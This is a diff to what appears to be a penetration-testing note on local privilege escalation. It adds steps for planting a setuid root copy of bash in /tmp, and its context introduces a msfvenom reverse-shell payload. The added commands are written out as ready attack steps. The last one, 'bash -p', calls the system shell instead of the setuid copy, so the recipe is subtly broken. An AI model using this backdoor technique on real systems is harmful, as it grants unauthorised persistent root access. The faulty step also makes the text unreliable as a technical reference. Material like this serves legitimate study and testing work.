@@ -61,6 +61,11 @@ $
 <br />
 
 ## Exploitation (Get a Shell Indirectly)
+if you can execute a command as root, you can 
+cp /bin/bash /tmp/mybash
+chmod 4777 /tmp/mybash
+bash -p
+
 
 We can also inject a bash script and execute arbitrary code.  
 First, create a reverse shell script **`/tmp/shell.elf`** using **msfvenom**.
